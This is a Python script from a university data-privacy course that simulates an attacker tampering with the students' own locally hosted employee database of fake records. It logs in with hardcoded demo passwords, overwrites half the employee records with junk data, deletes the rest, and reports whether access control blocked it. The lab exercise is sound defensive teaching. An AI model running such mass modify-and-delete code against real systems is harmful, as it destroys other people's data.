"""
data_tamper.py  —  Data tampering attack simulation
Course: Data Privacy (CSCN26H)  —  breach simulation component

Simulates an attacker who modifies and deletes critical employee data.
Target: our OWN Employee Management System running locally with fake data.
Run only against http://127.0.0.1:5000 inside the lab.

Usage:
    python data_tamper.py                 # attacks as an employee account (should be BLOCKED)
    python data_tamper.py --as-admin      # attacks as admin (modification/deletion SUCCEEDS)
"""
import sys
import requests

BASE = "http://127.0.0.1:5000"

# Which account the attacker uses. An employee login should be blocked by access
# control; an admin login (e.g. a stolen admin password) is able to tamper.
if "--as-admin" in sys.argv:
    USERNAME, PASSWORD = "admin", "admin123"
else:
    USERNAME, PASSWORD = "youssef", "youssef123"


def login(session):
    r = session.post(f"{BASE}/login",
                     data={"username": USERNAME, "password": PASSWORD},
                     allow_redirects=False)
    # a successful login redirects (302); a wrong password returns 200 with the form
    if r.status_code != 302:
        print(f"[!] Login failed for '{USERNAME}'. Check the username/password.")
        sys.exit(1)
    print(f"[+] Logged in as '{USERNAME}'")


def get_employees(session):
    r = session.get(f"{BASE}/api/employees")
    if r.status_code != 200:
        print(f"[!] Could not read employees (status {r.status_code})")
        return []
    return r.json()


def tamper(session, employees):
    """Try to MODIFY and DELETE critical records."""
    modified = deleted = blocked = 0

    # 1) Modification: overwrite half the employees with junk data
    for emp in employees[: len(employees) // 2]:
        r = session.put(f"{BASE}/api/employees/{emp['id']}", json={
            "first_name": "CORRUPTED",
            "last_name":  "DATA",
            "email":      f"hacked_{emp['id'][:6]}@evil.com",
            "phone":      "000000000",
            "salary":     1,
            "department_id": emp.get("department_id"),
        })
        if r.status_code == 200:
            modified += 1
            print(f"    [MODIFIED] {emp['first_name']} {emp['last_name']} -> CORRUPTED DATA")
        elif r.status_code == 403:
            blocked += 1
        # else: other error, ignore for the simulation

    # 2) Deletion: delete the other half
    for emp in employees[len(employees) // 2:]:
        r = session.delete(f"{BASE}/api/employees/{emp['id']}")
        if r.status_code == 200:
            deleted += 1
            print(f"    [DELETED]  {emp['first_name']} {emp['last_name']}")
        elif r.status_code == 403:
            blocked += 1

    return modified, deleted, blocked


def main():
    print("=" * 60)
    print("  DATA TAMPERING ATTACK SIMULATION")
    print(f"  Target : {BASE}")
    print(f"  Attacker account: {USERNAME}")
    print("=" * 60)

    session = requests.Session()
    login(session)

    employees = get_employees(session)
    print(f"[+] Found {len(employees)} employee records\n")

    print("[*] Attempting to modify and delete records...")
    modified, deleted, blocked = tamper(session, employees)

    print("\n" + "-" * 60)
    print("  RESULT")
    print(f"    Records modified : {modified}")
    print(f"    Records deleted  : {deleted}")
    print(f"    Attempts blocked : {blocked}")
    print("-" * 60)
    if blocked and not modified and not deleted:
        print("  ATTACK BLOCKED — access control stopped the tampering. ✔")
    elif modified or deleted:
        print("  ATTACK SUCCEEDED — critical data was tampered with. ✘")
        print("  (Restore from backup to recover the data.)")
    print("=" * 60)


if __name__ == "__main__":
    main()